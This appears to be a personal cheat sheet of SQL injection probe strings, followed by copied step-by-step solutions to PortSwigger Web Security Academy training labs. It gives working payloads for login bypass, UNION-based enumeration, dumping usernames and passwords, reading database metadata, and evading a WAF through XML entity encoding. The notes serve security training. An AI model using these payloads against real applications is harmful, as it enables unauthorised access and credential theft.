########### Cek SQLi
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos;  
%%2727
%25%27
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false

########### https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
Use Burp Suite to intercept and modify the request that sets the product category filter.

Modify the category parameter, giving it the value '+OR+1=1--

Submit the request, and verify that the response now contains additional items.

########### https://portswigger.net/web-security/sql-injection/lab-login-bypass
Use Burp Suite to intercept and modify the login request.

Modify the username parameter, giving it the value: administrator'--

########### https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

Use Burp Suite to intercept and modify the request that sets the product category filter.

Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.

Modify the category parameter to add an additional column containing a null value:
'+UNION+SELECT+NULL,NULL--

Continue adding null values until the error disappears and the response includes 
additional content containing the null values.

########### https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

Use Burp Suite to intercept and modify the request that sets the product category filter.

Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:
'+UNION+SELECT+NULL,NULL,NULL--

Try replacing each null with the random value provided by the lab, for example:
'+UNION+SELECT+'abcdef',NULL,NULL--

If an error occurs, move on to the next null and try that instead.

########### https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

Use Burp Suite to intercept and modify the request that sets the product category filter.

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
'+UNION+SELECT+'abc','def'--

Use the following payload to retrieve the contents of the users table:
'+UNION+SELECT+username,+password+FROM+users--

Verify that the application's response contains usernames and passwords.

########### https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

Use Burp Suite to intercept and modify the request that sets the product category filter.

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter:
'+UNION+SELECT+NULL,'abc'--

Use the following payload to retrieve the contents of the users table:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--

Verify that the application's response contains usernames and passwords.

########### https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

Use Burp Suite to intercept and modify the request that sets the product category filter.

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
'+UNION+SELECT+'abc','def'#

Use the following payload to display the database version:
'+UNION+SELECT+@@version,+NULL#

########### https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

Use Burp Suite to intercept and modify the request that sets the product category filter.

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
'+UNION+SELECT+'abc','def'--

Use the following payload to retrieve the list of tables in the database:
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
Find the name of the table containing user credentials. 

########### https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

Identify the vulnerability

    Observe that the stock check feature sends the productId and storeId to the application in XML format.

    Send the POST /product/stock request to Burp Repeater.

    In Burp Repeater, probe the storeId to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions
    that evaluate to other potential IDs, for example:
    <storeId>1+1</storeId>

    Observe that your input appears to be evaluated by the application, returning the stock for different stores.

    Try determining the number of columns returned by the original query by appending a UNION SELECT statement to the original store ID:
    <storeId>1 UNION SELECT NULL</storeId>

    Observe that your request has been blocked due to being flagged as a potential attack.

Bypass the WAF

    As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. 
    Just highlight your input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.

    Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.

Craft an exploit

    Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, 
    the application returns 0 units, implying an error.

    As you can only return one column, you need to concatenate the returned usernames and passwords, for example:
    <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>

    Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a ~ character.

    Use the administrator's credentials to log in and solve the lab.


